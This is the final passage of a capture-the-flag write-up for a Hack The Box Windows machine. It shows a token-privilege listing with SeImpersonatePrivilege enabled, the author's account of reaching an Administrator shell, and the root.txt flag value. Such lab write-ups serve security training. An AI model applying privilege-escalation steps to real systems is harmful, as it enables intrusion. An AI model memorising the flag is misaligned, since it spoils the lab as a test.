SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled 
SeCreateGlobalPrivilege                   Create global objects                                              Enabled 
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
SeTimeZonePrivilege                       Change the time zone                                               Disabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled

ERROR: Unable to get user claims information.
```

and then I was logged in as Administrator, with full privileges.

### Root.txt

```text
c:\Users\Administrator\Desktop>type root.txt
type root.txt
b7f7dbc6de4b535a2e84e8c3362d081b
```

After getting an Administrator shell it was simple to collect my final proof.

Thanks to [`egotisticalSW`](https://app.hackthebox.eu/users/94858) for something interesting or useful about this machine.

If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!

